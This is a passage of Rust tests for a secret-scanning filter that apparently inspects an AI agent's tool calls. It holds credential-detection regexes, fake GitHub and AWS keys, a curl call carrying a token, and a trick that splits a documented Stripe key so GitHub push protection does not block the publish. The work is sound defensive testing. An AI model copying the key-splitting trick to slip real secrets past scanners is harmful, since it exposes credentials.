                regex: "gh[ps]_[A-Za-z0-9_]{36,}".into(),
                score: 5.0,
                severity: "critical".into(),
                message: "GitHub token detected".into(),
            },
        ];
        let filter = SecretScanFilter::new(patterns);
        assert_eq!(filter.pattern_count(), 1);

        let ctx = make_ctx(ToolCallType::ShellExec {
            command: "curl".into(),
            args: vec![
                "-H".into(),
                "Authorization: token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn".into(),
            ],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "github-token");
    }

    #[test]
    fn test_real_secret_corpus_builds_regex_set_with_full_count() {
        // 1617 after S1 (2026-08-07) removed the two looser unanchored FaunaDB /
        // Resend duplicates (`fauna-secret-bare`, `resend-api-key-bare`) and the
        // 2026-09-02 removal of `bitcoin-wif-private-key-v2` (an unanchored WIF
        // regex whose Base58 class overlapped lowercase hex, so it matched inside
        // sccache/git object-hash path segments - see wif_v2_style_regex... test).
        let patterns = load_real_secret_patterns();
        assert_eq!(patterns.len(), 1617);

        let filter = SecretScanFilter::new(patterns);

        assert!(matches!(filter.matcher, Matcher::Set { .. }));
        assert_eq!(filter.pattern_count(), 1617);
    }

    /// Regression guard for the class of false positive removed on 2026-09-02:
    /// an unanchored secret regex whose Base58/hex-overlapping character class
    /// matches a substring of a longer hash-shaped token (sccache cache keys,
    /// git object hashes, SHA-256 hex, UUIDs) that appears in a scanned path or
    /// argument. `bitcoin-wif-private-key-v2` did this to every sccache atomic
    /// rename (`~/.cache/sccache/<hex>`), queueing routine build churn. No
    /// shipped pattern may match any of these non-secret hash shapes.
    #[tokio::test]
    async fn shipped_patterns_never_match_hash_shaped_nonsecrets() {
        let filter = SecretScanFilter::new(load_real_patterns());
        // Real values observed in the field plus canonical hash shapes.
        let non_secrets = [
            "/home/dan/.cache/sccache/preprocessor/b/6/e/b6eb65d7d1f153b62edd3e7a9e3ebce9cb26a38a239169738bc95fef16474ef3",
            "/home/dan/.cache/sccache/0/7/078a755217424a9fff44c56b484686189ff94a9fe2948db927aa5c2d5edf5e63",
            "/home/dan/.cache/sccache/5/2/52b59774af3f8bc942f55fe77fd3a946749d99351b7547cbbf16f0cc0db17cae",
            // git object hash (SHA-1) and a SHA-256 blob id
            "objects/9c/e8a01ed5628444560fca33a58d42460321784860",
            "9ce8a01ed5628444560fca33a58d42460321784860c23d3fee57f4670ae12e60",
            // UUID
            "550e8400-e29b-41d4-a716-446655440000",
        ];
        for value in non_secrets {
            // Scan it the way the supervisor would: as a rename destination path.
            let ctx = make_ctx(ToolCallType::FileRename {
                old_path: format!("{value}.tmp"),
                new_path: value.to_string(),
            });
            let result = filter.evaluate(&ctx).await.unwrap();
            assert!(
                !result.matched,
                "shipped secret pattern `{}` false-positived on hash-shaped non-secret `{}` (matched score {})",
                result.rule_id, value, result.score
            );
        }
    }

    #[tokio::test]
    async fn test_highest_score_wins() {
        let filter = SecretScanFilter::new(test_patterns());
        // Content has both an AWS key (5.0) and a generic api_key (3.0)
        let ctx = make_ctx_with_args(
            ToolCallType::FileWrite {
                path: "/tmp/config".into(),
                content_hash: "abc".into(),
            },
            serde_json::json!({
                "content": "api_key = AKIAQYLPMN5HZ3RT2WX4"
            }),
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        // AWS key pattern (5.0) should win over generic api_key (3.0)
        assert_eq!(result.score, 5.0);
    }

    // -----------------------------------------------------------------------
    // FP §5.11: benign-shape suppression — paired accept (benign → no match)
    // and guard (real secret in the same context still fires) tests.
    // -----------------------------------------------------------------------

    async fn scan(filter: &SecretScanFilter, content: &str) -> FilterResult {
        let ctx = make_ctx_with_args(
            ToolCallType::FileRead {
                path: "/repo/file".into(),
            },
            serde_json::json!({ "content": content }),
        );
        filter.evaluate(&ctx).await.unwrap()
    }

    /// The real shipped corpus (1,620 patterns) is what actually over-matches in
    /// the field, so the suppression tests run against it, not the toy set.
    fn real_filter() -> SecretScanFilter {
        SecretScanFilter::new(load_real_secret_patterns())
    }

    #[tokio::test]
    async fn benign_git_sha_not_flagged() {
        let f = real_filter();
        // 40-hex SHA-1 (git) and 64-hex SHA-256, bare, no assignment.
        assert!(
            !scan(&f, "commit da39a3ee5e6b4b0d3255bfef95601890afd80709")
                .await
                .matched,
            "bare 40-hex git SHA must not be flagged"
        );
        assert!(
            !scan(
                &f,
                "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  file.tar.gz"
            )
            .await
            .matched,
            "bare 64-hex SHA-256 checksum must not be flagged"
        );
    }

    #[tokio::test]
    async fn guard_hex_secret_in_assignment_still_fires() {
        let f = real_filter();
        // Same 40-hex shape, but assigned to a secret key → must still fire.
        assert!(
            scan(
                &f,
                "aws_secret_access_key=da39a3ee5e6b4b0d3255bfef95601890afd80709"
            )
            .await
            .matched,
            "a 40-hex value assigned to a secret key must still fire"
        );
    }

    #[tokio::test]
    async fn benign_lockfile_integrity_not_flagged() {
        let f = real_filter();
        let line = r#""integrity": "sha512-Gd2UZBJDkXlY7GbJxfsE8/nvKkUEU1G38c1siN6QP6a9Pt9KZ6JZNS9wgFwgL2C6Wq3jUMP+5K8aXFYS8H8YqQ==""#;
        assert!(
            !scan(&f, line).await.matched,
            "npm/yarn lockfile integrity hash must not be flagged"
        );
    }

    #[tokio::test]
    async fn benign_uuid_and_jwt_not_flagged() {
        let f = real_filter();
        assert!(
            !scan(&f, "id = 550e8400-e29b-41d4-a716-446655440000")
                .await
                .matched,
            "RFC-4122 UUID must not be flagged"
        );
        let jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U";
        assert!(
            !scan(&f, jwt).await.matched,
            "JWT-shaped token must not be flagged as a generic secret"
        );
    }

    #[tokio::test]
    async fn benign_documented_placeholders_not_flagged() {
        let f = real_filter();
        // The Stripe documented-example secret key is split with `concat!` so
        // the contiguous `sk_test_…` literal never appears in source. This keeps
        // GitHub push-protection from blocking the OSS-mirror publish on a
        // false positive while leaving the value byte-identical at runtime — the
        // scanner-under-test still receives the full key. (The publishable
        // `pk_test_…` key is not a secret, so it needs no split.)
        for placeholder in [
            concat!("stripe key: sk_test_", "4eC39HqLyjWDarjtT1zdp7dc"),
            "publishable: pk_test_TYooMQauvdEDq54NiTphI7jx",
        ] {
            assert!(
                !scan(&f, placeholder).await.matched,
                "documented placeholder must not be flagged: {placeholder:?}"
            );
        }
    }

    #[tokio::test]
    async fn guard_live_keys_still_fire() {
        let f = real_filter();
        // `live` markers and real-shaped keys must NOT be suppressed.
        assert!(
            scan(&f, "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn")
                .await
                .matched,
            "GitHub PAT must still fire"
        );
        assert!(
            scan(&f, "AKIAQYLPMN5HZ3RT2WX4").await.matched,
            "real-shaped AWS access key id must still fire"
        );
    }

    // -----------------------------------------------------------------------
    // FP §5.11: low-signal asset (minified / node_modules) down-weighting.
    // -----------------------------------------------------------------------

    async fn scan_at(filter: &SecretScanFilter, path: &str, content: &str) -> FilterResult {
        let ctx = make_ctx_with_args(
            ToolCallType::FileRead {
                path: path.to_string(),
            },
            serde_json::json!({ "content": content }),
        );
        filter.evaluate(&ctx).await.unwrap()
    }

    #[test]
    fn low_signal_asset_path_detection() {
        for p in [
            "/app/node_modules/foo/dist/index.js",
            "/app/static/bundle.min.js",
            "vendor.min.css",
            "/app/dist/app.js.map",
        ] {
            assert!(is_low_signal_asset_path(p), "{p:?} should be low-signal");
        }
        for p in ["/app/src/config.js", "/etc/app/secrets.env", "main.rs"] {
            assert!(
                !is_low_signal_asset_path(p),
                "{p:?} should NOT be low-signal"
            );
        }
    }

    #[tokio::test]
    async fn generic_match_in_minified_asset_is_down_weighted() {
        let f = real_filter();
        // No quotes — they'd be JSON-escaped (`\"`) in arguments.to_string()
        // and break the assignment regex; the heuristic matches unquoted too.
        let content = "var apiKey=ABCDEFGHIJKLMNOPQRST12345;";

        // Outside an asset path: the generic keyword heuristic fires at full
        // weight and would QUEUE.
        let full = scan_at(&f, "/app/src/config.js", content).await;
        assert!(
            full.matched && full.score >= 3.0,
            "full weight off-asset: {full:?}"
        );

        // Under a minified bundle / node_modules: down-weighted (not
        // suppressed) below the QUEUE threshold.
        for path in [
            "/app/static/vendor.min.js",
            "/app/node_modules/pkg/dist/index.js",
        ] {
            let r = scan_at(&f, path, content).await;
            assert!(
                r.matched,
                "still recorded (not suppressed): {path:?} -> {r:?}"
            );
            assert!(
                r.score < 3.0,
                "generic match in low-signal asset must be down-weighted below QUEUE: {path:?} -> {r:?}"
            );
        }
    }

    #[tokio::test]
    async fn guard_real_key_in_minified_asset_keeps_full_weight() {
        let f = real_filter();
        // A real GitHub PAT embedded in a minified node_modules bundle is a
        // supply-chain leak and must NOT be down-weighted.
        let r = scan_at(
            &f,
            "/app/node_modules/evil/dist/bundle.min.js",
            "const t='ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn';",
        )
        .await;
        assert!(
            r.matched && r.score >= 3.0,
            "specific-format key must keep full weight in node_modules: {r:?}"
        );
    }
}
